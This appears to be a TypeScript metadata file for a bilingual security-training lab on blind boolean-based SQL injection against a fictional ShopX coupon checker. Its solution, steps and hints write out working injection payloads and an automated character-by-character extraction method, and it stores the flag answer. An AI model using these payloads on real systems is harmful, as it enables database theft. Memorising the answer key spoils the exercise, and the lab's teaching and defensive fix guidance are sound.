// src/modules/practice-labs/sql-injection/labs/lab3/lab3.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab3Metadata: LabMetadata = {
  slug: 'sqli-blind-boolean',
  title: 'SQL Injection: Blind Boolean-Based Extraction',
  ar_title: 'حقن SQL: الاستخراج الأعمى (Boolean-Based)',
  description:
    "ShopX's promo code endpoint returns only 'valid' or 'invalid' — but it is vulnerable to Blind SQL Injection. Extract a hidden admin secret one character at a time.",
  ar_description:
    "نقطة التحقق من الكوبون في ShopX ترجع فقط 'صالح' أو 'غير صالح' — لكنها عرضة لـ Blind SQLi. استخرج السر المخفي حرفًا بحرف.",
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'SQL Injection',
    'Blind SQLi',
    'Boolean Inference',
    'Character-by-Character Extraction',
    'Automated Exploitation',
  ],
  xpReward: 350,
  pointsReward: 175,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Extract the full admin secret using Boolean-based Blind SQLi in the promo code validator.',
  ar_goal:
    'استخرج السر الكامل للمدير باستخدام Blind SQL Injection المبني على Boolean في نقطة التحقق من الكوبون.',

  briefing: {
    en: `ShopX — an e-commerce platform with 2 million active users — has a promo code system at checkout.
Enter a valid code: "Coupon applied!". Enter an invalid one: "Invalid coupon."
That's all you get. No data. No errors. Just two possible answers.
Somewhere in that database, there's a secret note that only the admin can see.
You can't read the database directly. But you can ask it yes/no questions... 
and with enough patience, yes/no is all you need.`,
    ar: `ShopX — منصة تجارة إلكترونية بـ 2 مليون مستخدم نشط — لديها نظام كوبونات عند الدفع.
أدخل كوداً صحيحاً: "تم تطبيق الكوبون!". أدخل كوداً خاطئاً: "كوبون غير صالح."
هذا كل ما ستحصل عليه. لا بيانات. لا أخطاء. فقط إجابتان محتملتان.
في مكان ما في قاعدة البيانات هذه، توجد ملاحظة سرية لا يستطيع رؤيتها إلا المدير.
لا تستطيع قراءة قاعدة البيانات مباشرة. لكن يمكنك طرح أسئلة بنعم/لا...
وبما يكفي من الصبر، نعم/لا هو كل ما تحتاجه.`,
  },

  stepsOverview: {
    en: [
      'Confirm the injection point — prove the coupon field is vulnerable despite showing no data',
      'Verify that a secret entry exists in the database by asking the database a true/false question',
      'Extract the secret one character at a time using SUBSTRING and boolean conditions',
      'Iterate through every character position until the full secret is assembled',
      'Automate the extraction process — manual character-by-character is too slow at scale',
    ],
    ar: [
      'أكّد نقطة الحقن — أثبت أن حقل الكوبون ضعيف رغم عدم ظهور أي بيانات',
      'تحقق من وجود إدخال سري في قاعدة البيانات بطرح سؤال صح/خطأ على قاعدة البيانات',
      'استخرج السر حرفاً بحرف باستخدام SUBSTRING وشروط boolean',
      'كرر على كل موضع حرف حتى يكتمل تجميع السر الكامل',
      'أتمت عملية الاستخراج — الاستخراج اليدوي حرفاً بحرف بطيء جداً عند التوسع',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      "ShopX's checkout page validates promo codes. The response is always binary — no data, no errors. An admin note containing the flag was stored as a private content entry with title='admin_secret'. Extract it character by character using boolean conditions.",
    vulnerableCode:
      'SELECT id FROM "LabGenericContent"\n' +
      "WHERE userId='...' AND labId='..'\n" +
      "AND title='valid_coupon' AND body='COUPON_INPUT'",
    exploitation:
      "1) Confirm: ' OR '1'='1'-- → 'Coupon applied!'\n" +
      "2) Verify secret exists: ' OR (SELECT COUNT(*) FROM \"LabGenericContent\" WHERE title='admin_secret') > 0 --\n" +
      "3) Extract char 1: ' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1)='F'--\n" +
      '4) Loop position 1→30, charset: FLAG{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n' +
      '5) Assemble all chars → submit as flag.',
    steps: {
      en: [
        "POST /lab3/check-coupon with { coupon: \"' OR '1'='1'--\" } → response: 'Coupon applied!' → injection confirmed",
        "Verify secret: { coupon: \"' OR (SELECT COUNT(*) FROM \\\"LabGenericContent\\\" WHERE title='admin_secret') > 0 --\" } → 'Coupon applied!'",
        "Extract char 1: { coupon: \"' OR (SELECT SUBSTRING(body,1,1) FROM \\\"LabGenericContent\\\" WHERE title='admin_secret' LIMIT 1)='F'--\" } → 'Coupon applied!' → char 1 = 'F'",
        "Extract char 2: change SUBSTRING(body,2,1) and test 'L' → 'Coupon applied!' → char 2 = 'L'",
        "Write a script: loop pos 1→30, for each pos try all chars in charset until 'Coupon applied!' → assemble FLAG{...} → submit",
      ],
      ar: [
        "أرسل POST /lab3/check-coupon مع { coupon: \"' OR '1'='1'--\" } → استجابة: 'تم تطبيق الكوبون!' → الحقن مؤكد",
        "تحقق من السر: { coupon: \"' OR (SELECT COUNT(*) FROM \\\"LabGenericContent\\\" WHERE title='admin_secret') > 0 --\" } → 'تم تطبيق الكوبون!'",
        "استخرج الحرف 1: { coupon: \"' OR (SELECT SUBSTRING(body,1,1) FROM \\\"LabGenericContent\\\" WHERE title='admin_secret' LIMIT 1)='F'--\" } → 'تم تطبيق الكوبون!' → الحرف 1 = 'F'",
        "استخرج الحرف 2: غيّر SUBSTRING(body,2,1) واختبر 'L' → 'تم تطبيق الكوبون!' → الحرف 2 = 'L'",
        "اكتب سكريبت: كرر pos من 1→30، لكل موضع جرب كل أحرف charset حتى 'تم تطبيق الكوبون!' → جمّع FLAG{...} → أرسل",
      ],
    },
    fix: [
      'Use parameterized queries — never concatenate coupon input into SQL',
      'Return generic error messages — never leak boolean differences that hint at injection',
      'Rate limit the coupon endpoint — automated character extraction requires hundreds of requests',
      'Monitor for repeated requests with SQL patterns (SUBSTRING, COUNT, SELECT) in inputs',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Blind Boolean-Based SQLi exploits endpoints that return different responses based on true/false conditions, without showing actual data. By asking the database binary questions (is character X at position Y equal to Z?), an attacker can reconstruct any value character by character.',
      ar: 'يستغل حقن SQL الأعمى المبني على Boolean نقاط النهاية التي تُرجع استجابات مختلفة بناءً على شروط صح/خطأ، دون إظهار بيانات فعلية. بطرح أسئلة ثنائية على قاعدة البيانات (هل الحرف X في الموضع Y يساوي Z؟)، يمكن للمهاجم إعادة بناء أي قيمة حرفاً بحرف.',
    },
    impact: {
      en: 'Any data in the database can be extracted including passwords, tokens, and secrets — even from endpoints that appear to show nothing. Automation makes this practical even for large secrets.',
      ar: 'يمكن استخراج أي بيانات في قاعدة البيانات بما في ذلك كلمات المرور والـ tokens والأسرار — حتى من نقاط النهاية التي تبدو أنها لا تُظهر شيئاً. الأتمتة تجعل هذا عملياً حتى للأسرار الكبيرة.',
    },
    fix: [
      'Parameterized queries eliminate the injection point entirely',
      'Consistent response times and messages prevent timing/boolean inference',
      'Aggressive rate limiting on all public endpoints',
      'Web Application Firewall with SQLi signature detection',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        "Confirm injection: try coupon value `' OR '1'='1'--` — if it returns 'Coupon applied!', the field is injectable despite showing no data.",
    },
    {
      order: 2,
      xpCost: 20,
      content:
        "A secret note exists with title='admin_secret'. Confirm its existence: `' OR (SELECT COUNT(*) FROM \"LabGenericContent\" WHERE title='admin_secret') > 0 --`",
    },
    {
      order: 3,
      xpCost: 40,
      content:
        "Extract one character at a time: `' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1) = 'F'--` — change position and character until you find each one.",
    },
  ],

  flagAnswer: 'FLAG{BLIND_SQLI_EXFIL_SUCCESS}',
  initialState: {
    contents: [
      {
        title: 'valid_coupon',
        body: 'SAVE20SUMMER',
        isPublic: true,
        author: 'marketing',
      },
      {
        title: 'valid_coupon',
        body: 'FLASH50OFF',
        isPublic: true,
        author: 'marketing',
      },
      {
        title: 'valid_coupon',
        body: 'WELCOME10',
        isPublic: true,
        author: 'marketing',
      },
      {
        title: 'admin_secret',
        body: 'FLAG{BLIND_SQLI_EXFIL_SUCCESS}',
        isPublic: false,
        author: 'admin',
      },
    ],
  },
};
